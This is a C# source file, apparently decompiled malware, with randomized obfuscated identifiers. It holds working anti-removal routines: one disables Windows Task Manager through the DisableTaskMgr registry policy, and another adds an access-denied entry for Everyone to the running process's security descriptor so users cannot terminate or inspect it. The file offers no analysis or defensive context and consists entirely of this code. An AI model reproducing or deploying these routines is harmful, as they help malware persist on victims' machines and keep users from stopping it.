using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace tmhhYTpfSQZiU;

internal sealed class HkvfqrDSDcRz
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr XtgBKckInx, int ZpVbxsETKGr, [Out] byte[] HjfUupakayCjh, uint IUjAsGEcOxxcsT, out uint tJtAZoQDjOycP);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr uWKvQrNbyGLOiXok, int PexTMkiqTeNd, [In] byte[] VfIRbAZVlZBkfI);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void CHsYdZWEhRX(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			if (bool_0 && registryKey.GetValue("DisableTaskMgr") != null)
			{
				registryKey.DeleteValue("DisableTaskMgr");
			}
			else
			{
				registryKey.SetValue("DisableTaskMgr", "1");
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor xIHoubUfMjL(IntPtr intptr_0)
	{
		byte[] hjfUupakayCjh = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, hjfUupakayCjh, 0u, out var tJtAZoQDjOycP);
		if ((long)tJtAZoQDjOycP > 32767L)
		{
			throw new Win32Exception();
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, hjfUupakayCjh = new byte[tJtAZoQDjOycP], tJtAZoQDjOycP, out tJtAZoQDjOycP))
		{
			throw new Win32Exception();
		}
		return new RawSecurityDescriptor(hjfUupakayCjh, 0);
	}

	private void AgeRugoVdwShJ(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		if (!SetKernelObjectSecurity(intptr_0, 4, array))
		{
			throw new Win32Exception();
		}
	}

	public void EiJaFciylcLkvUPi()
	{
		IntPtr currentProcess = GetCurrentProcess();
		RawSecurityDescriptor rawSecurityDescriptor = xIHoubUfMjL(currentProcess);
		rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		AgeRugoVdwShJ(currentProcess, rawSecurityDescriptor);
	}
}
